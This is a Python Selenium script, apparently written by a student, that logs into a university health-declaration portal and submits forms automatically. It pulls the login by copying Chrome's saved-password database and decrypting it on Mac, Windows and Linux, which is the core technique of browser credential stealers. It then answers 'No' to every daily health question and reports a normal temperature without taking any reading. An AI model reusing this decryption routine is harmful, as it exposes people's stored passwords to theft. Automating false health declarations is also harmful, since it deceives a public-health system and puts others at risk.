# -*- coding: utf-8 -*-
"""
Created on Wed Jun 10 11:22:00 2020
Last edit on Mon Aug 31 2020
version 1.1

@author: T.Vic
note:	This version no longer requires users to input their userid 
		and password into the environment variable but automatically 
		fetch the information from Chrome itself. 
		If you prefer the older method or don't have Chrome, use the
		previous version!
"""

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import os
import time
import sys
import sqlite3
import json
import subprocess
import platform
import secretstorage
import string
from getpass import getuser
from importlib import import_module
from os import unlink
from shutil import copy
from pyvirtualdisplay import Display

try:
    import win32crypt
except:
    pass




class autoHealthDeclaration:
    
    def __init__ (self):
        self.sutd_declaration_url = "https://tts.sutd.edu.sg/tt_login.aspx?formmode=expire"
        self.userID_elem_name = "ctl00$pgContent1$uiLoginid" 
        self.pw_elem_name =  "ctl00$pgContent1$uiPassword"
        self.login_page_url = "https://tts.sutd.edu.sg/tt_home_user.aspx"
        self.daily_declaration_url = "https://tts.sutd.edu.sg/tt_daily_dec_user.aspx"
        self.temperature_taking_url = "https://tts.sutd.edu.sg/tt_temperature_taking_user.aspx"
        self.account_url = "tts.sutd.edu.sg"

        chrome_options = Options()
        # You comment the next 3 lines to debug if there is any issue
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-dev-shm-usage')
        # Path to your selenium browser driver here
        self.driver = webdriver.Chrome("/path/to/Documents/chromedriver", chrome_options=chrome_options)
        
        #Get username and password from chrome
        chrome_machine = Chrome()
        self.userid, self.userpw = chrome_machine.get_tt_account(self.account_url)
        


    def main(self):
        self.driver.get(self.sutd_declaration_url)
        if self.login() != self.login_page_url:
            print("login failed")
            exit()
           
        self.dailyDeclaration()
        self.alertHandling() 
        self.tempTaking()
        self.alertHandling()
        self.tempTaking()
        self.alertHandling()
        
        self.driver.quit()
            
    def login(self):
        userID = self.driver.find_element_by_name(self.userID_elem_name)
        pw = self.driver.find_element_by_name(self.pw_elem_name)
        
        userID.clear()
        userID.send_keys(self.userid)
        pw.clear()
        pw.send_keys(self.userpw)
        pw.send_keys(Keys.RETURN)
        time.sleep(1)
        return self.driver.current_url
    
    def tempTaking(self):
        self.driver.get(self.temperature_taking_url)
        self.driver.find_element_by_xpath("//select[@name='ctl00$pgContent1$uiTemperature']/option[text()='Less than or equal to 37.6°C']").click()

        submit_btn = self.driver.find_element_by_xpath(".//form//input[@type='submit']")
        submit_btn.click()
        
    
    def dailyDeclaration(self):
        time.sleep(1)
        self.driver.get(self.daily_declaration_url)
        buttons = self.driver.find_elements_by_xpath(".//form//input[@type='radio']")
        self.box_clicked = 0
        
        def check_box():
            self.box_clicked = 0
            for i in range(len(buttons)):
                btn_ls = self.driver.find_elements_by_xpath(".//form//input[@type='radio']")
                print(len(btn_ls))
                if (btn_ls[i].get_attribute("value").endswith("No")):
                    btn_ls[i].click()
                    self.box_clicked += 1
            
        while(self.box_clicked < 4):
            try:
                check_box()
            except:
                print("Error occured, trying again.")
                
        submit_btn = self.driver.find_element_by_xpath(".//form//input[@type='submit']")
        submit_btn.click()

    def alertHandling(self):
        alert = self.driver.switch_to.alert
        alert.accept()


class ChromeMac:
    """ Decryption class for chrome mac installation """
    def __init__(self):
        """ Mac Initialization Function """
        my_pass = subprocess.Popen(
            "security find-generic-password -wa 'Chrome'",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True)
        stdout, _ = my_pass.communicate()
        my_pass = stdout.replace(b'\n', b'')

        iterations = 1003
        salt = b'saltysalt'
        length = 16

        kdf = import_module('Crypto.Protocol.KDF')
        self.key = kdf.PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = (f"/Users/{getuser()}/Library/Application Support/Google/Chrome/Default/")

    def decrypt_func(self, enc_passwd):
        """ Mac Decryption Function """
        aes = import_module('Crypto.Cipher.AES')
        initialization_vector = b' ' * 16
        enc_passwd = enc_passwd[3:]
        cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
        decrypted = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode('utf8')


class ChromeWin:
    """ Decryption class for chrome windows installation """
    def __init__(self):
        """ Windows Initialization Function """
        # search the genral chrome version path
        win_path = f"C:\\Users\\{getuser()}\\AppData\\Local\\Google" "\\{chrome}\\User Data\\Default\\"
        win_chrome_ver = [
            item for item in
            ['chrome', 'chrome dev', 'chrome beta', 'chrome canary']
            if os.path.exists(win_path.format(chrome=item))
        ]
        self.dbpath = win_path.format(chrome=''.join(win_chrome_ver))
        # self.dbpath = (f"C:\\Users\\{getuser()}\\AppData\\Local\\Google"
        #                "\\Chrome\\User Data\\Default\\")

    def decrypt_func(self, enc_passwd):
        """ Windows Decryption Function """
        win32crypt = import_module('win32crypt')
        data = win32crypt.CryptUnprotectData(enc_passwd, None, None, None, 0)
        return data[1].decode('utf8')


class ChromeLinux:
    """ Decryption class for chrome linux installation """
    def __init__(self):
        """ Linux Initialization Function """
        my_pass = 'peanuts'.encode('utf8')
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == 'Chrome Safe Storage':
                my_pass = item.get_secret()
                break
        iterations = 1
        salt = b'saltysalt'
        length = 16

        kdf = import_module('Crypto.Protocol.KDF')
        self.key = kdf.PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"

    def decrypt_func(self, enc_passwd):
        """ Linux Decryption Function """
        aes = import_module('Crypto.Cipher.AES')
        initialization_vector = b' ' * 16
        enc_passwd = enc_passwd[3:]
        cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
        decrypted = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode('utf8')


class Chrome:
    """ Generic OS independent Chrome class """
    def __init__(self):
        """ determine which platform you are on """
        target_os = platform.system()
        if target_os == 'Darwin':
            self.chrome_os = ChromeMac()
        elif target_os == 'Windows':
            self.chrome_os = ChromeWin()
        elif target_os == 'Linux':
            self.chrome_os = ChromeLinux()

    @property
    def get_login_db(self):
        """ getting "Login Data" sqlite database path """
        return self.chrome_os.dbpath

    def get_tt_account(self, account_url):
        """ get username and pw from the tt url.
        	This is given that the username and pw was saved on the tt site.
        """
        userid = ""
        userpw = ""
        copy(self.chrome_os.dbpath + "Login Data", "Login Data.db")
        conn = sqlite3.connect("Login Data.db")
        cursor = conn.cursor()
        cursor.execute("""
            SELECT action_url, username_value, password_value
            FROM logins; """)

        for result in cursor.fetchall():
        	if(account_url in result[0]):
        		userid = result[1]
        		_passwd = self.chrome_os.decrypt_func(result[2])
        		passwd = ''.join(i for i in _passwd if i in string.printable)
        		userpw = passwd
        if(userid == "" or userpw == ""):
        	print("Error, no record of username or password saved on the tt site on chrome")

        conn.close()
        unlink("Login Data.db")

        return userid, userpw


if __name__ == "__main__":
    ahd = autoHealthDeclaration()
    ahd.main()
    exit(0)
    
